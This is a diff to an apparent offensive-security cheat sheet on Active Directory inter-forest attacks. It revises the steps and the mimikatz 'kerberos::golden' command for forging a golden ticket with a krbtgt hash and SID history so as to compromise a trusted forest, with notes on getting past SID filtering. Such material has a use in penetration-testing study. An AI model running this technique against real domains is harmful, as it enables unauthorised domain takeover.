@@ -5,10 +5,10 @@ The inter-forest explotation is when you attempt to compromise an additinal fore
 **OWNING AN ADDITIONAL FOREST WITH GOLDEN TICKETS:**
 
 With a bidirecctional trust set, we must do the following:
-Craft a golden ticket for another forest(dev-contoso.com) with an RID superior of 1000 and with SID history correctly configured, if our RID is less than 1000 our SID will get filtered regardless of the SID history settings:
+Craft a golden ticket for another forest(dev-contoso.com) with an RID superior of 1000(we must find an existing group in our target forest that has an RID equal or superior than 1000) and with SID history correctly configured(SID history enabled), if our RID is less than 1000 our SID will get filtered regardless of the SID history settings:
 
 ```
-kerberos::golden /user:h4x /domain:<origin_domain_name> /sid:<origin_domain_sid> /krbtgt:<origin_domain_krbtgt_ntlm_hash> /sids:<sid_of_target_domain>-RIDsuperiorthan1000 /ptt
+kerberos::golden /user:h4x /domain:<origin_domain_name> /sid:<origin_domain_sid> /krbtgt:<origin_domain_krbtgt_ntlm_hash> /sids:<group_with_RID_equal_or_superior_than_1000_sid> /ptt
 ```
 (this command has to be thrown from a mimikatz shell)
 
